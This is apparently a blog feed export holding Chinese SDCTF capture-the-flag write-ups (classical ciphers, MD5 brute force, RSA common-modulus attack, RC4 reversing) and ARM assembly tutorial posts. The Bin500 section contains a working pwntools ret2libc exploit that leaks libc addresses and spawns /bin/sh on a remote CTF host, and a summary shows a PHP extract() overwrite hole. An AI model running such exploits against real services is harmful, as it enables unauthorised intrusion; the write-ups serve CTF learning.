<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto200-Knock"><a href="#Crypto200-Knock" class="headerlink" title="Crypto200(Knock)"></a>Crypto200(Knock)</h2><p>text文件中数字替换为英文字母得：zjqzhexjzmooqrssaidaiynlebnzjovosltahzjerhorrqxoeironlobdozavoouzjovosqfqsltahmqnqrrjotoerzjohorrqxoebooqydrztyqqojolx</p>
<p>与knock文件中…._…替换：<br>zjqz_hexjz_mo_oqrs_sai_daiyn_lebn_zjo_vos_ltah_zjer_horrqxo_e_iron_lobdo_za_voou_zjo_vos_qfqs_ltah_mqn_qrr_joto_er_zjo_horrqxo_ebooqydrztyqqojolx</p>
<p>在线解密（<a href="http://quipqiup.com/）" target="_blank" rel="external">http://quipqiup.com/）</a><br><img src="/images/sdctf/11.png" alt=""></p>
<p>that_might_be_easy_you_could_find_the_key_from_this_message_i_used_fence_to_keep_the_key_away_from_bad_ass_here_is_the_message_ineealcstrlaaehefg</p>
<p>ineealcstrlaaehefg，测试发现是栅栏加密，解出来得到icanseetherealflag<br>flag为SDCTF{md5(icanseetherealflag)}<br>Flag:SDCTF{ad0fe582c45dc970bfa9d6815d79684d}</p>
<h2 id="Crypto300-MD5"><a href="#Crypto300-MD5" class="headerlink" title="Crypto300(MD5)"></a>Crypto300(MD5)</h2><p>发现第51个文件大小异常，提取，hex中补全PNG文件头，得到：</p>
<p><img src="/images/sdctf/12.png" alt=""></p>
<p>MD5爆破即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">x = range(<span class="number">97</span>,<span class="number">122</span>)</div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> x:</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> x:</div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> x:</div><div class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> x:</div><div class="line">                 <span class="keyword">for</span> e <span class="keyword">in</span> x:</div><div class="line">                	 m = hashlib.md5()</div><div class="line">                	 flag = <span class="string">"SDCTF&#123;a95"</span>+chr(a)+<span class="string">"0b39186"</span>+chr(b)+<span class="string">"887"</span>+chr(c)+<span class="string">"949f87"</span>+chr(d)+<span class="string">"20b44b"</span>+chr(e)+<span class="string">"b5"</span>+<span class="string">"&#125;"</span></div><div class="line">                         m.update(flag)</div><div class="line">                         n= m.hexdigest()</div><div class="line">                         n0 = list(n)</div><div class="line">                         <span class="keyword">if</span> n0[<span class="number">0</span>]==<span class="string">'9'</span>:</div><div class="line">                           <span class="keyword">if</span> n0[<span class="number">1</span>]==<span class="string">'5'</span>:</div><div class="line">                        	 <span class="keyword">if</span> n0[<span class="number">2</span>]==<span class="string">'d'</span>:</div><div class="line">                        	   <span class="keyword">if</span> n0[<span class="number">3</span>]==<span class="string">'c'</span>:</div><div class="line">                        	     <span class="keyword">if</span> n0[<span class="number">7</span>]==<span class="string">'8'</span>:</div><div class="line">                        	       <span class="keyword">if</span> n0[<span class="number">30</span>]==<span class="string">'a'</span>:</div><div class="line">                        	 	     <span class="keyword">if</span> n0[<span class="number">31</span>]==<span class="string">'3'</span>:</div><div class="line">                        	 	       <span class="keyword">print</span> n0</div><div class="line">                        	 	       <span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p>Flag:SDCTF{a95a0b39186f887b949f87f20b44bdb5}</p>
<h2 id="Crypto500-RSA"><a href="#Crypto500-RSA" class="headerlink" title="Crypto500(RSA)"></a>Crypto500(RSA)</h2><p>分析加密脚本，使用了相同的N,不同的e,加密相同的数据,且两个加密指数互素，可以通过共模攻击在两个密文和公钥被嗅探的情况下还原出明文m的值</p>
<p>两个加密指数互质(e1,e2)=1,即存在s1,s2使得s1e1+s2e2=1<br>c1 ≡ me1 mod n<br>c2 ≡ me2 mod n<br>即 c1s1 c2s2 ≡ m mod n</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</div><div class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</div><div class="line">n=<span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></div><div class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</div><div class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    g, y, x = egcd(b % a, a)</div><div class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</div><div class="line">fo1 = open(<span class="string">'flag.enc1'</span>, <span class="string">'rb'</span>)</div><div class="line">fo2 = open(<span class="string">'flag.enc2'</span>, <span class="string">'rb'</span>)</div><div class="line">datafo1 = fo1.read()</div><div class="line">c1 = s2n(datafo1)</div><div class="line">fo1.close()</div><div class="line">datafo2 = fo2.read()</div><div class="line">c2 = s2n(datafo2)</div><div class="line">fo2.close()</div><div class="line">c2 = invert(c2,n)</div><div class="line">e1 = <span class="number">17</span></div><div class="line">e2 = <span class="number">65537</span></div><div class="line">s = egcd(e1,e2)</div><div class="line">s1 = s[<span class="number">1</span>]</div><div class="line">s2 = s[<span class="number">2</span>]</div><div class="line">s2 = - s2</div><div class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</div><div class="line"><span class="keyword">print</span> n2s(m)</div></pre></td></tr></table></figure>
<p>flag.txt:<br>“You were not born a winner, and you were not born a loser. You are what you make yourself be.”SDCTF{ef31070d66440687a73beb6242f298bc}</p>
<h1 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h1><h2 id="Bin300-RC4"><a href="#Bin300-RC4" class="headerlink" title="Bin300(RC4)"></a>Bin300(RC4)</h2><p>RC4算法,逆向得到key和data<br>key= “I_am_the_flag”;<br>data={19,118,31,-9,43,-100,54,-56,-85,-91,-65,-51,-71,86,-27,-75,79,3,19,89,-46,58,10,68,121,85,-8,-36,-116,75,107,-68,124,81,-101,-112,-73,-80,37}</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</div><div class="line">    &#123;</div><div class="line">        s[i] = i;</div><div class="line">        k[i] = key[i%Len];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</div><div class="line">    &#123;</div><div class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</div><div class="line">        tmp = s[i];</div><div class="line">        s[i] = s[j];</div><div class="line">        s[j] = tmp;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</div><div class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</div><div class="line">    &#123;</div><div class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">        j = (j + s[i]) % <span class="number">256</span>;</div><div class="line">        tmp = s[i];</div><div class="line">        s[i] = s[j];</div><div class="line">        s[j] = tmp;</div><div class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</div><div class="line">        Data[k] ^= s[t];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = <span class="string">"I_am_the_flag"</span>;</div><div class="line">    <span class="keyword">char</span> flag[<span class="number">512</span>]= &#123;<span class="number">19</span>,<span class="number">118</span>,<span class="number">31</span>,<span class="number">-9</span>,<span class="number">43</span>,<span class="number">-100</span>,<span class="number">54</span>,<span class="number">-56</span>,<span class="number">-85</span>,<span class="number">-91</span>,<span class="number">-65</span>,<span class="number">-51</span>,<span class="number">-71</span>,<span class="number">86</span>,<span class="number">-27</span>,<span class="number">-75</span>,<span class="number">79</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">89</span>,<span class="number">-46</span>,<span class="number">58</span>,<span class="number">10</span>,<span class="number">68</span>,<span class="number">121</span>,<span class="number">85</span>,<span class="number">-8</span>,<span class="number">-36</span>,<span class="number">-116</span>,<span class="number">75</span>,<span class="number">107</span>,<span class="number">-68</span>,<span class="number">124</span>,<span class="number">81</span>,<span class="number">-101</span>,<span class="number">-112</span>,<span class="number">-73</span>,<span class="number">-80</span>,<span class="number">37</span>&#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(flag); </div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));</div><div class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)flag, len);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>或py解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> random, base64,binascii</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></div><div class="line">    <span class="string">"""RC4 algorithm"""</span></div><div class="line">    x = <span class="number">0</span></div><div class="line">    box = range(<span class="number">256</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></div><div class="line">        box[i], box[x] = box[x], box[i]</div><div class="line">    x = y = <span class="number">0</span></div><div class="line">    out = []</div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</div><div class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></div><div class="line">        y = (y + box[x]) % <span class="number">256</span></div><div class="line">        box[x], box[y] = box[y], box[x]</div><div class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</div><div class="line"></div><div class="line">data = <span class="string">"数据"</span></div><div class="line">key = <span class="string">'密钥'</span></div><div class="line">decoded_data = crypt(data,key)</div><div class="line"><span class="keyword">print</span> decoded_data</div></pre></td></tr></table></figure>
<p>Flag:SDCTF{912128f324fd3ea3f5d9cb517b4d9001}</p>
<h2 id="Bin500-PwnPwnPwn"><a href="#Bin500-PwnPwnPwn" class="headerlink" title="Bin500(PwnPwnPwn)"></a>Bin500(PwnPwnPwn)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</div><div class="line">elf = ELF(<span class="string">'bin300'</span>)</div><div class="line">debug =<span class="number">0</span></div><div class="line"><span class="keyword">if</span> debug ==<span class="number">1</span>:</div><div class="line">  p = process(<span class="string">'./bin300'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">  p = remote(<span class="string">'123.207.144.156'</span>, <span class="number">10003</span>)</div><div class="line"></div><div class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</div><div class="line">got_write = elf.got[<span class="string">'write'</span>]</div><div class="line">vulfun_addr = <span class="number">0x804843b</span></div><div class="line">payload1 = <span class="string">'a'</span>*<span class="number">268</span>  </div><div class="line">payload1 += p32(plt_write) </div><div class="line">payload1 += p32(vulfun_addr) </div><div class="line">payload1 += p32(<span class="number">1</span>)</div><div class="line">payload1 += p32(got_write) </div><div class="line">payload1 += p32(<span class="number">4</span>)</div><div class="line">p.send(payload1)</div><div class="line"></div><div class="line">write_addr = u32(p.recv(<span class="number">4</span>))</div><div class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</div><div class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</div><div class="line">payload2 = <span class="string">'a'</span>*<span class="number">268</span></div><div class="line">payload2 += p32(system_addr)</div><div class="line">payload2 += p32(vulfun_addr)</div><div class="line">payload2 += p32(binsh_addr)</div><div class="line">p.send(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p><img src="/images/sdctf/13.png" alt=""></p>
<p>Flag:SDCTF{af15d5fdacd5fdfea300e88a8e253e82}</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;web100&quot;&gt;&lt;a href=&quot;#web100&quot; class=&quot;headerlink&quot; title=&quot;web100&quot;&gt;&lt;/a&gt;web100&lt;/h2&gt;&lt;p&gt; 查看源码，发现extract函数，提交覆盖&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SDPC ==&amp;gt;aaaaa&amp;lt;br&amp;gt;password ==&amp;gt;sdpcsdpcsdpc&amp;lt;br&amp;gt;&amp;lt;!--
 if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) {?&amp;gt;
     extract($_POST);
 if ($SDPC == $password) { 
     echo $key;
--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://pwnable.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ARM(二)</title>
    <link href="http://pwnable.me/2017/02/25/ARM2/"/>
    <id>http://pwnable.me/2017/02/25/ARM2/</id>
    <published>2017-02-25T05:02:53.000Z</published>
    <updated>2017-06-04T05:31:12.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><p><img src="/images/arm/arm3.png" alt=""></p>
<p>a. 分支指令B</p>
<pre><code>B{&lt;cond&gt;}label          跳转到label处执行，PC=label
</code></pre><a id="more"></a>
<p>例：</p>
<pre><code>backword    SUB R1,R1,#1
            CMP R1,#0           比较R1和0
            BEQ forward         如果R1=0，跳转到forware处执行
            SUB R1,R2,#3
            SUB R1,R1,#1
forward     ADD R1,R2,#4
            ADD R2,R3,#2
            B backword          无条件跳转到backword处执行
</code></pre><p>b. 带返回的分支指令BL</p>
<pre><code>BL{&lt;cond&gt;}label         在跳转之前，将PC的当前内容保存在R14(LR)中保存，因此，可以通过将R14的内容重新加载到PC中，返回到跳转指令之后的指令处执行。该指令用于实现子程序的调用，程序的返回可通过把LR寄存器的值复制到PC寄存器中来实现。
</code></pre><p>例：</p>
<pre><code>BL func             跳转到子程序
ADD R1,R2,#2        子程序调用完返回后执行的语句，返回地址
....
func                子程序
...
MOV R15,R14         复制返回地址到PC，实现子程序的返回
</code></pre><p>c. 带状态切换的分支指令BX</p>
<pre><code>BX{&lt;cond&gt;} Rm       当执行BX指令时，如果条件cond满足，则处理器会判断Rm的位[0]是否为1，如果为1则跳转时自动将CPSR寄存器的标志T置位，并将目标地址的代码解释为Thumb代码来执行，则处理器会切换到Thumb状态，反之，若Rm的位[0]为0，则跳转时自动将CPSR寄存器的标志T复位，并将目标地址处的代码解释为ARM代码来执行，即处理器会切换到ARM状态。
</code></pre><p>注意：bx lr的作用等同于mov pc,lr。即跳转到lr中存放的地址处。 非零值存储在R0中返回。</p>
<p>那么lr存放的是什么地址呢？lr就是连接寄存器(Link Register, LR)，在ARM体系结构中LR的特殊用途有两种：一是用来保存子程序返回地址；二是当异常发生时，LR中保存的值等于异常发生时PC的值减4（或者减2），因此在各种异常模式下可以根据LR的值返回到异常发生前的相应位置继续执行。　　</p>
<p>当通过BL或BLX指令调用子程序时，硬件自动将子程序返回地址保存在R14寄存器中。在子程序返回时，把LR的值复制到程序计数器PC即可实现子程序返回。</p>
<h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p>a. 进栈出栈</p>
<p>出栈使用LDM指令，进栈使用STM指令。LDM和STM指令往往结合下面一些参数实现堆栈的操作。</p>
<pre><code>FD:满递减堆栈。
ED:空递减堆栈。
FA:满递增堆栈。
EA:空递增堆栈。
</code></pre><p>满堆栈是指SP(R13)指向堆栈的最后一个已使用地址或满位置(也就是SP指向堆栈的最后一个数据项的位置)；相反，空堆栈是指SP指向堆栈的第一个没有使用的地址或空位置。<br>LDMFD和STMFD分别指POP出栈和PUSH入栈<br>b. PUSH指令</p>
<pre><code>PUSH{cond} reglist      PUSH将寄存器推入满递减堆栈
PUSH {r0,r4-r7}         将R0,R4-R7寄存器内容压入堆栈
</code></pre><p>c. POP指令</p>
<pre><code>POP{cond} reglist       POP从满递减堆栈中弹出数据到寄存器
POP {r0,r4-r7}          将R0,R4-R7寄存器从堆栈中弹出
</code></pre><p>。。。。。。<br>。。。。。<br>。。。。<br>。。。<br>。。<br>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;分支语句&quot;&gt;&lt;a href=&quot;#分支语句&quot; class=&quot;headerlink&quot; title=&quot;分支语句&quot;&gt;&lt;/a&gt;分支语句&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/arm/arm3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;a. 分支指令B&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;B{&amp;lt;cond&amp;gt;}label          跳转到label处执行，PC=label
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="Foundation" scheme="http://pwnable.me/tags/Foundation/"/>
    
  </entry>
  
  <entry>
    <title>ARM(一)</title>
    <link href="http://pwnable.me/2017/02/15/ARM/"/>
    <id>http://pwnable.me/2017/02/15/ARM/</id>
    <published>2017-02-15T05:02:53.000Z</published>
    <updated>2017-06-04T05:31:24.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ARM寄存器"><a href="#ARM寄存器" class="headerlink" title="ARM寄存器"></a>ARM寄存器</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><pre><code>1)未分组寄存器:R0~R7 
2)分组寄存器:R8~812 
     R13:SP，常用作堆栈指针，始终指向堆栈的顶部，当一个数据(32位)推入堆栈时，SP(R13的值减4)向下浮动指向下一个地址，即新的栈顶，当数据从堆栈中弹出时，SP(R13的值加4)向上浮动指向新的栈顶。 
     R14:连接寄存器(LR),当执行BL子程序调用指令时，R14中得到R15(程序计数器PC)的备份，其他情况下，R14用作通用寄存器。   
     R15:程序计数器(PC):用于控制程序中指令的执行顺序。正常运行时，PC指向CPU运行的下一条指令。每次取值后PC的值会自动修改以指向下一条指令，从而保证了指令按一定的顺序执行。当程序的执行顺序发生改变(如转移)时，需要修改PC的值。
</code></pre><a id="more"></a>
<h2 id="状态寄存器"><a href="#状态寄存器" class="headerlink" title="状态寄存器"></a>状态寄存器</h2><pre><code>CPSR(R16):当前程序状态寄存器，用来保存ALU中的当前操作信息，控制允许和禁止中断、设置处理器的工作模式等。 
SPSRs:五个备份的程序状态寄存器，用来进行异常处理。当异常发生时，SPSR用于保存CPSR的当前值，从异常退出时可由SPSR来恢复CPSR。

N、Z、C、V均为条件码标志位，他们的内容可被运算的结果所改变。
N:正负标志，N=1表示运算的结果为负，N=0表示运算的结果为正或0
Z:零标志，Z=1表示运算的结果为0，Z=0表示运算的结果为非0
C:进位标志，加法运算产生了进位时则C=1，否则C=0
  借位标志，减肥运算产生了借位则C=0，否则C=1
V:溢出标志，V=1表示有溢出，V=0表示无溢出
</code></pre><h2 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h2><pre><code>程序正常执行时，每执行一条ARM指令，当前指令计数器增加4个字节。
</code></pre><hr>
<h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><h2 id="汇编指令格式"><a href="#汇编指令格式" class="headerlink" title="汇编指令格式"></a>汇编指令格式</h2><pre><code>&lt;opcode&gt;{&lt;cond&gt;}{S}&lt;Rd&gt;,&lt;Rn&gt;{,&lt;OP2&gt;} 
格式中&lt;&gt;的内容必不可少，{}中的内容可省略 
&lt;opcode&gt;:表示操作码，如ADD表示算术加法 
{&lt;cond&gt;}:表示指令执行的条件域，如EQ、NE等。 
{S}:决定指令的执行结果是否影响CPSR的值，使用该后缀则指令执行的结果影响CPSR的值，否则不影响 
&lt;Rd&gt;:表示目的寄存器 
&lt;Rn&gt;:表示第一个操作数，为寄存器 
&lt;op2&gt;:表示第二个操作数，可以是立即数、寄存器或寄存器移位操作数 
例:ADDEQS R0,R1,#8;其中操作码为ADD,条件域cond为EQ,S表示该指令的执行影响CPSR寄存器的值，目的寄存器Rd为R0,第一个操作数寄存器Rd为R1，第二个操作数OP2为立即数#8
</code></pre><h2 id="指令的可选后缀"><a href="#指令的可选后缀" class="headerlink" title="指令的可选后缀"></a>指令的可选后缀</h2><pre><code>S：指令执行后程序状态寄存器的条件标志位将被刷新     
   ADDS R1,R0,#2 
!:指令中的地址表达式中含有!后缀时，指令执行后，基址寄存器中的地址值将发生变化，变化的结果是：基址寄存器中的值(指令执行后)=指令执行前的值 + 地址偏移量    
   LDR R3,[R0,#2]!    指令执行后，R0 = R0 + 2
</code></pre><h2 id="指令的条件执行"><a href="#指令的条件执行" class="headerlink" title="指令的条件执行"></a>指令的条件执行</h2><p>指令的条件后缀只是影响指令是否执行，不影响指令的内容</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">条件码	助记符后缀       标志	                  含义</div><div class="line"><span class="number">0000</span>	EQ	       Z置位	                  相等</div><div class="line"><span class="number">0001</span>	NE	       Z清零	                  不相等</div><div class="line"><span class="number">0010</span>	CS	       C指令	                  无符号数大于或等于</div><div class="line"><span class="number">0011</span>	CC	       C清零	                  无符号数小于</div><div class="line"><span class="number">0100</span>	MI	       N置位	                  负数</div><div class="line"><span class="number">0101</span>	PL	       N清零	                  正数或零</div><div class="line"><span class="number">0110</span>	VS	       V置位	                  溢出</div><div class="line"><span class="number">0111</span>	VC	       V清零	                  未溢出</div><div class="line"><span class="number">1000</span>	HI	       C置位Z清零                  无符号数大于</div><div class="line"><span class="number">1001</span>	LS	       C清零Z置位                  无符号数小于或等于</div><div class="line"><span class="number">1010</span>	GE	       N等于V	                 带符号数大于或等于</div><div class="line"><span class="number">1011</span>	LT	       N不等于V	                 带符号数小于</div><div class="line"><span class="number">1100</span>	GT	       Z清零且(N等于V)             带符号数大于</div><div class="line"><span class="number">1101</span>	LE	       Z置位或(N不等于V)           带符号数小于或等于</div><div class="line"><span class="number">1110</span>	AL	       忽略	                 无条件执行</div></pre></td></tr></table></figure>
<p>例：ADDEQ R4,R3,#1 相等则相加，即CPSR中Z置位时该指令执行，否则不执行。</p>
<h2 id="ARM指令分类"><a href="#ARM指令分类" class="headerlink" title="ARM指令分类"></a>ARM指令分类</h2><p><img src="/images/arm/arm1.png" alt=""></p>
<h2 id="ARM寻址方式"><a href="#ARM寻址方式" class="headerlink" title="ARM寻址方式"></a>ARM寻址方式</h2><p>寻址方式就是根据指令中操作数的信息来寻找操作数实际物理地址的方式<br>a.立即数寻址</p>
